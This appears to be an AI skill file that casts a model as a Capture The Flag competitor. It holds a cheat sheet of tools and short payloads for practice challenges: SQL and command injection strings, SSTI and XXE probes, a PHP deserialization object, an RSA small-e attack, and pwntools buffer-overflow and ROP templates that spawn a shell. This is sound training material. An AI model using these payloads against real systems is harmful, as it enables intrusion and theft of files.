---
name: ctf-competitor
description: "Expert Capture The Flag competition including web exploitation, reverse engineering, cryptography, forensics, and pwn challenges"
---

# CTF Competitor

## Overview

This skill transforms you into a **CTF Competition Expert**. You will master **Web Exploitation**, **Reverse Engineering**, **Cryptography**, **Forensics**, and **Binary Exploitation** for solving CTF challenges.

## When to Use This Skill

- Use when competing in CTF competitions
- Use when practicing security skills
- Use when solving hacking challenges
- Use when learning new exploitation techniques
- Use when training for security certifications

---

## Part 1: CTF Categories

### 1.1 Challenge Types

| Category | Focus |
|----------|-------|
| **Web** | SQL injection, XSS, SSRF, auth bypass |
| **Pwn (Binary)** | Buffer overflow, ROP, heap exploitation |
| **Reverse** | Disassembly, decompilation, logic analysis |
| **Crypto** | Classic ciphers, RSA, AES, hash attacks |
| **Forensics** | File analysis, memory dumps, network captures |
| **Misc** | OSINT, programming, steganography |

### 1.2 Popular CTF Platforms

| Platform | Focus |
|----------|-------|
| **picoCTF** | Beginner-friendly |
| **HackTheBox** | Realistic machines |
| **TryHackMe** | Guided learning |
| **CTFtime** | Competition calendar |
| **OverTheWire** | Wargames |

---

## Part 2: Web Challenges

### 2.1 Common Vulnerabilities

```python
# SQL Injection
' OR '1'='1
' UNION SELECT 1,2,3,flag FROM flags--

# Command Injection
; cat /flag.txt
$(cat /flag.txt)
`cat /flag.txt`

# SSTI (Server-Side Template Injection)
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}

# XXE
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<data>&xxe;</data>

# Deserialization (PHP)
O:8:"UserData":1:{s:4:"file";s:10:"/flag.txt";}
```

### 2.2 Tools

| Tool | Purpose |
|------|---------|
| **Burp Suite** | Request manipulation |
| **sqlmap** | Automated SQLi |
| **dirb/ffuf** | Directory brute force |
| **curl** | Manual requests |

---

## Part 3: Reverse Engineering

### 3.1 Workflow

```
File Analysis → Disassembly → Decompilation → Logic Analysis → Solve
```

### 3.2 Tools

| Tool | Purpose |
|------|---------|
| **Ghidra** | Free decompiler |
| **IDA Pro** | Industry standard |
| **radare2/Cutter** | Open source |
| **GDB + pwndbg** | Dynamic analysis |
| **strings** | Extract strings |

### 3.3 Common Techniques

```bash
# Basic analysis
file challenge
strings challenge | grep flag
ltrace ./challenge
strace ./challenge

# Ghidra decompilation
# Look for main(), strcmp(), password checks
```

---

## Part 4: Cryptography

### 4.1 Classic Ciphers

| Cipher | Identification |
|--------|----------------|
| **Caesar** | Letter frequency preserved |
| **Vigenère** | Repeating key patterns |
| **Base64** | Ends with = or == |
| **ROT13** | A-M ↔ N-Z |
| **XOR** | If key is short, frequency analysis |

### 4.2 RSA Attacks

```python
# Small e attack (e=3)
from Crypto.Util.number import long_to_bytes
import gmpy2

c = <ciphertext>
e = 3
m = gmpy2.iroot(c, e)[0]
print(long_to_bytes(m))

# Wiener attack (small d)
# Factor n when p and q are close
```

### 4.3 Tools

```bash
# Online
CyberChef (decode/encode)
dCode.fr (classic ciphers)
factordb.com (factor n)

# Python
from Crypto.Cipher import AES
from Crypto.Util.number import *
import hashlib
```

---

## Part 5: Forensics

### 5.1 File Analysis

```bash
# Identify file type
file mystery
xxd mystery | head -20
binwalk mystery

# Extract hidden data
binwalk -e mystery
foremost mystery
steghide extract -sf image.jpg

# Memory forensics
volatility -f memdump.raw imageinfo
volatility -f memdump.raw --profile=Win7SP1x64 pslist
```

### 5.2 Network Forensics

```bash
# Wireshark filters
http contains "flag"
tcp.stream eq 5

# Extract files
File → Export Objects → HTTP

# Command line
tshark -r capture.pcap -Y "http" -T fields -e http.file_data
```

---

## Part 6: Pwn (Binary Exploitation)

### 6.1 Buffer Overflow

```python
from pwn import *

# Find offset
cyclic(200)
# Crash at 0x61616165 → cyclic_find(0x61616165)

# Ret2win (call win function)
payload = b'A' * offset + p64(win_address)

# Shell using pwntools
p = process('./challenge')
p.sendline(payload)
p.interactive()
```

### 6.2 ROP Chain

```python
from pwn import *

elf = ELF('./challenge')
rop = ROP(elf)

# Find gadgets
rop.call('system', [next(elf.search(b'/bin/sh'))])

payload = b'A' * offset + rop.chain()
```

---

## Part 7: CTF Toolkit

### 7.1 Essential Setup

```bash
# Install pwntools
pip install pwntools

# Install Ghidra
wget https://github.com/NationalSecurityAgency/ghidra/releases/...

# SecLists
git clone https://github.com/danielmiessler/SecLists

# RsaCtfTool
git clone https://github.com/RsaCtfTool/RsaCtfTool
```

### 7.2 Quick Reference

| Task | Command/Tool |
|------|--------------|
| Decode Base64 | `echo "..." \| base64 -d` |
| Find strings | `strings -n 10 file` |
| Hex dump | `xxd file` |
| Decompile | Ghidra / IDA |
| Network | Wireshark / tshark |
| Web | Burp Suite |
| Binary | pwntools + GDB |

---

## Part 8: Best Practices Checklist

### ✅ Do This

- ✅ **Read the Challenge Carefully**: Hints in description.
- ✅ **Start with Easy Points**: Build momentum.
- ✅ **Take Notes**: Document your approach.

### ❌ Avoid This

- ❌ **Tunnel Vision**: If stuck, switch challenges.
- ❌ **Over-Automating**: Sometimes manual is faster.
- ❌ **Not Checking Write-ups**: After CTF ends, learn from others.

---

## Related Skills

- `@senior-penetration-tester` - Real-world testing
- `@malware-analyst` - Reverse engineering
- `@forensic-investigator` - Forensics deep dive
